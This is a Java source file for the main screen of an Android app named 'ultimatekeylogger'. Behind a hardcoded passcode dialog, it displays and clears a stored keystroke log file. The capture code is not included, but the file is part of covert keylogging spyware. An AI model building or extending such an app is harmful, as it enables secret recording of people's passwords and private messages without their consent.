package com.sutd.ultimatekeylogger;

import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.StrictMode;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.nio.charset.Charset;

import static android.provider.Telephony.Mms.Part.FILENAME;


public class MainActivity extends AppCompatActivity {
    final Context context = this;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        LayoutInflater li = LayoutInflater.from(context);
        View promptsView = li.inflate(R.layout.prompt, null);
        AlertDialog.Builder mDialogBuilder = new AlertDialog.Builder(context);
        mDialogBuilder.setView(promptsView);
        final EditText userInput = (EditText) promptsView.findViewById(R.id.input_text);
        mDialogBuilder
                .setCancelable(false)
                .setPositiveButton("OK",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog,int id) {
                                if(userInput.getText().toString().equals("passcode")) dialog.cancel();
                                else finish();
                            }
                        })
                .setNegativeButton("Cancel",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int id) {
                                //dialog.cancel();
                                finish();
                            }
                        });
        AlertDialog alertDialog = mDialogBuilder.create();
        alertDialog.show();

    }
    void readFile(EditText et) {
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(openFileInput("logfile"), Charset.defaultCharset()));
            String str = "";
            while ((str = br.readLine()) != null) {
                et.setText(et.getText() + str);
            }
        } catch (FileNotFoundException e) {et.setText("Nothing to show");
        } catch (IOException e) {
            et.setText("Something went wrong");
        }
    }
    public void onchandler(View view)
    {
        EditText etLog = findViewById(R.id.etLog);
        etLog.setText("");
        readFile(etLog);
        //deleteFile("logfile");
    }
    public void onClearHandler(View view)
    {
        deleteFile("logfile");
    }
}
